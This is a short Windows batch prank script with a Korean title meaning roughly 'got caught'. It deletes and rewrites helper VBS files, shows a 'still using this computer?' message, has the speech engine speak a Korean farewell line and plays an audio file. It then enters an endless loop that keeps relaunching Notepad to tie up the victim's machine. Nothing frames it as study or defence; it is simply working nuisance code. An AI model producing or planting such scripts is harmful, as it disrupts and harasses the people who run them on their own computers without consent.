@echo off
title 걸려들었다
REM ------INIT-------
cd .\res\
del .\say.vbs >> nul
del .\diag2.vbs >> nul
cd ..\
REM ----------------
echo msgbox "still using this computer?", 4096+32, "lol" >> .\res\diag2.vbs
echo CreateObject("SAPI.SpVoice").Speak "잘가랏 나의 아기고양이,," >> .\res\say.vbs
.\res\say.vbs
.\res\noice.mp3
:loopforever
notepad
goto loopforever
